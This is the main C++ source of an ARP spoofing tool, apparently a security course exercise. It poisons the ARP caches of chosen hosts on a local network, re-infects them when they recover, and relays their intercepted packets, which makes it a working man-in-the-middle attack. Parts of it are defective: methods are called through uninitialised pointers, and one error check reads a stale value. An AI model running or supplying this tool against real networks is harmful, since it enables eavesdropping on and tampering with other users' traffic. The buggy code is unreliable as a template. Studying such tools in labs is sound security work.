#include <thread>
#include <vector>

#include "arp_spoofing.h"

using namespace std;

typedef struct {
  Mac sender_mac;
  Ip sender_ip;
  Mac target_mac;
  Ip target_ip;
  Mac attacker_mac;
  Ip attacker_ip;
} session;

static vector<session> sessions;

void usage() {
  printf(
      "syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> "
      "<target ip 2> ...]\n");
  printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int make_session(const char* ifname, Ip sender_ip, Ip target_ip, session* ses) {
  int res;
  ArpSpoofing* arpSpoofing;

  // sender_ip
  ses->sender_ip = sender_ip;
  // sender_mac
  uint8_t sender_mac_arr[Mac::SIZE];
  res = arpSpoofing->getMacByIp(ifname, sender_ip, sender_mac_arr);
  if (res < 0) {
    printf("fail to get sender's mac\n");
    return -1;
  }
  ses->sender_mac = Mac(sender_mac_arr);

  // target_ip
  ses->target_ip = target_ip;
  // target_mac
  uint8_t target_mac_arr[Mac::SIZE];
  res = arpSpoofing->getMacByIp(ifname, target_ip, target_mac_arr);
  if (res < 0) {
    printf("fail to get target's mac\n");
    return -1;
  }
  ses->target_mac = Mac(target_mac_arr);

  // attacker_ip
  uint8_t attacker_ip_arr[Ip::SIZE];
  res = arpSpoofing->getIpByInterface(ifname, attacker_ip_arr);
  if (res < 0) {
    printf("fail to get attacker's ip\n");
    return -1;
  }
  ses->attacker_ip = Ip(attacker_ip_arr);
  // get attacker's mac
  uint8_t attacker_mac_arr[Mac::SIZE];
  res = arpSpoofing->getMacByInterface(ifname, attacker_mac_arr);
  if (res < 0) {
    printf("fail to get attacker's mac\n");
    return -1;
  }
  ses->attacker_mac = Mac(attacker_mac_arr);

  // output
  printf("-------------- Session Info --------------\n");
  printf("Attacker: %s %s\n",
         std::string(ses->attacker_ip).c_str(),
         std::string(ses->attacker_mac).c_str());
  printf("Sender  : %s %s\n",
         std::string(ses->sender_ip).c_str(),
         std::string(ses->sender_mac).c_str());
  printf("Target  : %s %s\n",
         std::string(ses->target_ip).c_str(),
         std::string(ses->target_mac).c_str());
  return 0;
}

void infect_sessions(pcap_t* handle, int SpoofPriod) {
  while (1) {
    printf("-------------- Arp Spoofing --------------\n");
    ArpSpoofing* arpSpoofing;
    for (int i = 0; i < 5; i++) {
      sleep(1);
      for (auto ses : sessions) {
        int res =
            arpSpoofing->arp_infect(handle, ses.attacker_mac, ses.sender_mac, ses.sender_ip, ses.target_ip);
        if (res < 0) {
          printf("fail to infect\n");
        }
        if (!i)
          printf("> Infected %s -> %s \n",
                 string(ses.sender_ip).c_str(), string(ses.target_ip).c_str());
      }
    }
    printf("---------- End of Arp Spoofing ----------\n");
    sleep(SpoofPriod);
  }
}

static int SpoofPriod = 10;

int main(int argc, char* argv[]) {
  if (argc < 4 || argc & 1) {
    usage();
    return -1;
  }

  // get handle
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);  // reponse time 1000 -> 1
  if (handle == nullptr) {
    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
    return -1;
  }

  //! init sessions
  for (int i = 2; i < argc; i += 2) {
    Ip sender_ip = Ip(argv[i]);
    Ip target_ip = Ip(argv[i + 1]);
    session ses;
    int res = make_session(dev, sender_ip, target_ip, &ses);
    if (res < 0) {
      printf("fail to make session\n");
      return -1;
    }
    sessions.push_back(ses);
  }
  printf("---------- End of Session Info ----------\n\n");

  //! arp spoofing
  thread infection_thread(infect_sessions, handle, SpoofPriod);

  //! relay
  struct pcap_pkthdr* header;
  const u_char* received_packet;
  ArpSpoofing* arpSpoofing;

  while (1) {
    int res = pcap_next_ex(handle, &header, &received_packet);
    if (res == 0) continue;        // 패킷을 얻지 못함
    if (res == -1 || res == -2) {  // 패킷을 더이상 얻지 못하는 상태
      printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
      break;
    }
    for (auto ses : sessions) {
      bool is_spoofed = arpSpoofing->check_spoofed_packet(
          received_packet, ses.sender_mac, ses.target_mac);
      bool is_recover = arpSpoofing->check_recover_packet(
          received_packet, ses.sender_mac, ses.target_mac);
      if (is_spoofed) {
        // printf(">>> Detect spoofed packet <<<\n");
        arpSpoofing->relay_spoofed_packet(handle, header, received_packet, ses.attacker_mac, ses.target_mac);
        if (res < 0) {
          printf("fail to relay\n");
          return -1;
        }
      }
      if (is_recover) {
        int res =
            arpSpoofing->arp_infect(handle, ses.attacker_mac, ses.sender_mac, ses.sender_ip, ses.target_ip);
        if (res < 0) {
          printf("fail to infect\n");
          return -1;
        }
      }
    }
  }
  pcap_close(handle);
  return 0;
}
